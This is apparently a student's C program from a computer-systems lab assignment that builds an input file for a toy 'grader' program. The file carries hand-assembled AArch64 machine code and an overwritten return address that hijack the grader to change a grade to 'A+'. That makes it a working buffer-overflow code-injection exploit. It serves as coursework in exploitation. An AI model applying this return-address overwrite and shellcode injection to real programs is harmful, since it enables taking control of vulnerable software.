/*------------------------------------------------
Authors: Christian Ronda and Chris Paucar
createdataAplus.c
------------------------------------------------*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"

/*generates dataAplus file which is used as input to grader program                                  which will be used in our A attack. Returns 0.*/
int main(void){
   int i;
   FILE *psFile;
   unsigned long ulData;
   unsigned int adr1;
   unsigned int adr2;
   unsigned int mov1;
   unsigned int mov2;
   unsigned int strb1;
   unsigned int strb2;
   unsigned int b;
   unsigned int bl;

   /* machine code for instruction: adr x0, [sp, grade] */
   adr1 = MiniAssembler_adr(0, 0x420044, 0x420064);
   /* machine code for instruction: mov w1, "A" */
   mov1 = MiniAssembler_mov(1, 0x00000041);
   /* machine code for instruction: strb w1, [x0] */
   strb1 = MiniAssembler_strb(1, 0);
   /* machine code for instruction: bl puts */
   bl = MiniAssembler_bl(0x400600, 0x420070);
   /* machine code for instruction: adr x0, [sp, grade] */
   adr2 = MiniAssembler_adr(0, 0x420044, 0x420074);
   /* machine code for instruction: mov w1, "+" */
   mov2 = MiniAssembler_mov(1, 0x0000002B);
   /* machine code for instruction: strb w1, [x0] */
   strb2 = MiniAssembler_strb(1, 0);
   /* machine code for instruction: b printf */
   b = MiniAssembler_b(0x400864, 0x420080);
   psFile = fopen("dataAplus", "w");

   /* address of first machine language instruction in bss */
   ulData = 0x420064;
   /*put "Chris Ronda" into dataAplus file*/
   fprintf(psFile,"Chris Ronda");
   /*add 1 null byte*/
   putc('\0', psFile);

   /*add machine code instructions to dataAplus file*/
   /*fwrite(&mov1, sizeof(unsigned int), 1, psFile);*/
   fwrite(&adr1, sizeof(unsigned int), 1, psFile);
   fwrite(&mov1, sizeof(unsigned int), 1, psFile);
   fwrite(&strb1, sizeof(unsigned int), 1, psFile);
   fwrite(&bl, sizeof(unsigned int), 1, psFile);
   fwrite(&adr2, sizeof(unsigned int), 1, psFile);
   fwrite(&mov2, sizeof(unsigned int), 1, psFile);
   fwrite(&strb2, sizeof(unsigned int), 1, psFile);
   fwrite(&b, sizeof(unsigned int), 1, psFile);

   /* fills rest of text file with null bytes */
   for(i = 0; i < 4; i++){
      putc('\0', psFile);
   }

   /* overwrite x30 of getName with first machine language instruction */
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   fclose(psFile);

   return 0;
}
 
